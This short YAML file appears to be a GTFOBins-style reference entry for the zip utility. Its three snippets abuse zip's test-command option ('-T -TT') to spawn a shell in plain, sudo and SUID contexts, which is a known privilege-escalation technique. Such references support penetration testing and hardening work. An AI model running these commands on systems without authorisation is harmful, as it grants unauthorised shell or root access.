---
functions:
  execute-interactive:
    - code: |
        TF=$(mktemp -u)
        zip $TF /etc/hosts -T -TT 'sh #'
        rm $TF
  sudo-enabled:
    - code: |
        TF=$(mktemp -u)
        sudo zip $TF /etc/hosts -T -TT 'sh #'
        sudo rm $TF
  suid-limited:
    - code: |
        TF=$(mktemp -u)
        ./zip $TF /etc/hosts -T -TT 'sh #'
        sudo rm $TF
---
